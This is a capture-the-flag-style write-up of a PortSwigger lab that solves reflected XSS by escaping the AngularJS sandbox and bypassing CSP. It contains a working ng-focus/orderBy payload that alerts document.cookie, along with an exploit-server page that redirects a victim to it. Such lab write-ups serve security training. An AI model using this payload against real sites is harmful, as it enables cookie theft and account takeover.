# Reflected XSS with AngularJS sandbox escape and CSP

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp), you'll learn: Reflected XSS with AngularJS sandbox escape and CSP! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Background

This lab uses [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) and [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection).

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses CSP, escapes the AngularJS sandbox, and alerts `document.cookie`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-28/images/Pasted%20image%2020230101080626.png)

In here, we can see there is a search box.

Let's search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-28/images/Pasted%20image%2020230101080701.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-28/images/Pasted%20image%2020230101080717.png)

As you can see, our input is reflected to the web page.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-28/images/Pasted%20image%2020230101080822.png)

In here, we also can see the CSP (Content Security Policy) is enabled.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

In this case, it'll **only allow scripts to be loaded from the same origin as the page itself.**

**Now, let's try to inject some HTML tags:**
```html
<input autofocus>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-28/images/Pasted%20image%2020230101081637.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-28/images/Pasted%20image%2020230101081647.png)

Yep we can.

**Next, we need to bypass the AngularJS sandbox and CSP:**
```html
<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x
```

- First, we use `ng-focus` event in AngularJS to create a focus event that bypasses CSP.
- Then, use `$event`, which is an AngularJS variable that references the event object.
- After that, the `path` property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the `window` object.
- Finally, use the `orderBy` filter, and the `:` is the argument that is being sent to the filter. In the argument, instead of calling the `alert` function directly, we assign it to the variable `z`. The function will only be called when the `orderBy` operation reaches the `window` object in the `$event.path` array. This means it can be called in the scope of the window without an explicit reference to the `window` object, effectively bypassing AngularJS's `window` check.

**Now, we can go the exploit server, host our payload and deliver to victim:**
```html
<html>
    <head>
        <title>XSS-28</title>
    </head>
    <body>
        <script>
            window.location.replace("https://0a6b004b04d03a63c09d548600500044.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x");
        </script>
    </body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-28/images/Pasted%20image%2020230101084134.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-28/images/Pasted%20image%2020230101084141.png)

Nice!

# What we've learned:

1. Reflected XSS with AngularJS sandbox escape and CSP